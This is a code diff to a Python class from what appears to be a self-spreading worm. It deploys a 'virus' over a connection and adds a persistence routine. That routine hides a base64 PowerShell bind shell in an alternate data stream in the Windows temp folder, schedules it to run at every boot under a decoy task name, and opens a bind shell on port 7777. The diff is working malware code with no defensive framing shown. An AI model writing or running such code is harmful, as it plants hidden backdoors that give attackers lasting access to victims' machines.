@@ -25,6 +25,7 @@ class tunnel(threading.Thread):
         self.set_connection(conn,addr)
         print("Got a connection from: {}",addr)
         self.deploy_virus(self.worm.getfiledata(),conn)
+        self.create_persistence(self,conn)
     
     
     def sent_command(self, command, conn):
@@ -65,6 +66,27 @@ class tunnel(threading.Thread):
         else:
             return ""
 
+    def create_persistence(self, conn):
+        #creating a backdoor access on the remote server
+        command = b'Set-Content -path "$env:temp\\remain.tmp:hidden" -Value "'
+        command += self.generate_base64_bind_shell_code("windows").encode()
+        command += b'"'
+        self.sent_command(command,conn)
+        print("Store Base64 Bind Shell in Temp Folder")
+        print(self.get_response(conn))
+        
+        command = b'schtasks /create /tn "reminderr" /tr "powershell -Command \"$command=get-content $env:\\temp:hidden; powershell -encodedcommand $command\"" /sc onstart'
+        self.sent_command(command,conn)
+        print("Create a Schedule Tasks to Start the Bind Shell on Boot")
+        print(self.get_response(conn))
+        
+        command = b"powershell -encodedcommand "
+        command += self.generate_base64_bind_shell_code("windows").encode()
+        command+=b"\n"
+        self.sent_command(command,conn)
+        print("Create a Bind Shell on Port 7777")
+        print(self.get_response(conn))
+    
     def deploy_virus(self, data, conn, ostype="windows"):
         #print(data)
         server = deployment("0.0.0.0",8081,data)
@@ -113,18 +135,7 @@ class tunnel(threading.Thread):
             command+=b"\n"
             self.sent_command(command,conn)
             print("Target Response: {}".format(self.get_response(conn)))
-
-            #creating a backdoor access on the remote server
-            # command = b'Set-Content -path "$env:temp\\remain.tmp:hidden" -Value "'
-            # command += self.generate_base64_bind_shell_code("windows").encode()
-            # command += b'"'
-            # command = b'Get-Content "$env:temp\file.txt:stream_name"'
-            # command = b"powershell -encodedcommand "
-            # command += self.generate_base64_bind_shell_code("windows").encode()
-            # command+=b"\n"
-            # self.sent_command(command,conn)
             
-
         except TimeoutError as t:
             print("no Response")
             
